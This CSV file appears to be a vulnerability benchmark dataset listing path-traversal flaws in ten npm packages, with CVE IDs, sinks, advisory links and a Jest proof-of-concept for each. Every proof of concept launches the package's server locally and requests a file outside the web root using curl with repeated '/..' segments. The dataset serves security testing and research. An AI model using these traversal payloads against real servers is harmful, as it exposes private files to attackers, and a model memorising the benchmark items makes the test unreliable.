Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
path-traversal,,songcaihong,1.0.0,n/a,path-traversal/songcaihong_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in songcaihong"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/songcaihong/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:songcaihong:20180306; 
path-traversal,,zhanglina,1.0.0,n/a,path-traversal/zhanglina_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in zhanglina"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/zhanglina/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",n/a,index.js:10:8,https://security.snyk.io/vuln/npm:zhanglina:20180226; 
path-traversal,CVE-2020-8214,servey,2.2.0,3.0.0,path-traversal/servey_2.2.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in servey"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/servey/test/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/server/index.js:60:21,https://security.snyk.io/vuln/SNYK-JS-SERVEY-174122; https://github.com/advisories/GHSA-v3px-6cc8-f8j3
path-traversal,,wenluhong111,1.0.0,n/a,path-traversal/wenluhong111_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wenluhong111"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wenluhong111/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  let end_serv = ""fuser -k 8888/tcp"";
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    exec(end_serv, (error, stdout) => {
      done();
    });
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:wenluhong111:20180306; 
path-traversal,CVE-2017-16120,liyujing,1.1.0,n/a,path-traversal/liyujing_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in liyujing"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/liyujing/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:liyujing:20170510; https://github.com/advisories/GHSA-m3j9-p4x2-97q6
path-traversal,,yjmyjmyjm,1.0.0,n/a,path-traversal/yjmyjmyjm_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in yjmyjmyjm"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/yjmyjmyjm/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:yjmyjmyjm:20170617; https://github.com/advisories/GHSA-g376-whg7-896m
path-traversal,,my-sn,1.0.1,n/a,path-traversal/my-sn_1.0.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in my-sn"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/my-sn/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,server.js:41:7,https://security.snyk.io/vuln/npm:my-sn:20180226; 
path-traversal,,serverfff,1.1.1,n/a,path-traversal/serverfff_1.1.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverfff"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverfff/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:7:8,https://security.snyk.io/vuln/npm:serverfff:20180306; 
path-traversal,,lander,1.0.0,n/a,path-traversal/lander_1.0.0,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in lander"", (done) => {
  expect.assertions(1);
  const pkg = require(""lander"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8988/tcp"", () => {});
  } catch (e) {}
  pkg(8988);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8988${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:33:25,https://security.snyk.io/vuln/npm:lander:20180226; 
path-traversal,CVE-2017-16195,pytservce,1.0.0,n/a,path-traversal/pytservce_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in pytservce"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/pytservce/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",n/a,index.js:13:8,https://security.snyk.io/vuln/npm:pytservce:20170508; https://github.com/advisories/GHSA-jwjq-vp53-ph6m
